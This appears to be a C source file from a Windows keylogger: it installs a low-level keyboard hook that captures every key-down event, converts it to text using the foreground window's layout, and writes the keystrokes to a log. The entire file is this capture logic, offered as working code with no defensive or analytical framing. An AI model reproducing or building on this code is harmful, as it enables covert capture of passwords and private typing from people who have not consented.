#include "common.h"

HKL foreground_update_and_layout(void);



LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
		KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)lParam;
		HKL layout = foreground_update_and_layout(0);

		const wchar_t *named = named_key(k->vkCode);

		if (named){
			logger_write_raw(named);
		}
		else {
			BYTE state[256] = { 0 };
			GetKeyboardState(state);
			wchar_t buf[8] = { 0 };

			int n = ToUnicodeEx(
				k->vkCode,
				k->scanCode,
				state,
				buf,
				8,
				0,
				layout
			);
			if (n> 0){
				buf[n] = 0;
				logger_write_raw(buf);
			}
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}